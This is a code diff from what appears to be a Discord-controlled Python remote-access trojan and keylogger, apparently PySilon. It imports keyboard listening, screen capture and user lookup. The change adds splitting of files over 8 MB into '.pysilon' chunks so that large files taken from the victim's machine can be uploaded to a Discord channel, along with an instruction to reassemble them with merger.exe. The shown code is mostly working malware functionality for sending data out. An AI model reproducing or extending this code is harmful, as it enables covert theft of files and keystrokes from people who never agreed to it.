@@ -1,10 +1,12 @@
 import discord
 from pynput.keyboard import Key, Listener
-from shutil import copy2
+from shutil import copy2, rmtree
 import os
 import sys
 from PIL import ImageGrab
 from pathlib import Path
+from filesplit.split import Split
+from filesplit.merge import Merge
 from itertools import islice
 import time
 from getpass import getuser
@@ -228,7 +230,20 @@ async def on_message(message):
                         if os.stat(target_file).st_size <= 8388608:
                             await message.channel.send(file=discord.File(target_file))
                         else:
-                            print('bigger')
+                            Split(target_file, 'temp').bysize(1024*1024*8)
+                            splitted_files_to_send = os.listdir('temp')
+                            for sfile in splitted_files_to_send:
+                                if sfile != 'manifest':
+                                    os.rename('temp/' + sfile, 'temp/' + sfile + '.pysilon')
+                            splitted_files_to_send = os.listdir('temp')
+
+                            messages_from_sending_big_file = []
+                            for i in splitted_files_to_send:
+                                messages_from_sending_big_file.append(await message.channel.send(file=discord.File('temp/' + i)))
+                            rmtree('temp')
+                            reaction_msg = await message.channel.send('```Download all above files, run merger.exe and then react to this message```')
+                            messages_from_sending_big_file.append(reaction_msg)
+                            await reaction_msg.add_reaction('✅')
                     else:
                         reaction_msg = await message.channel.send('```❗ File or directory not found.```'); await reaction_msg.add_reaction('🔴')
 
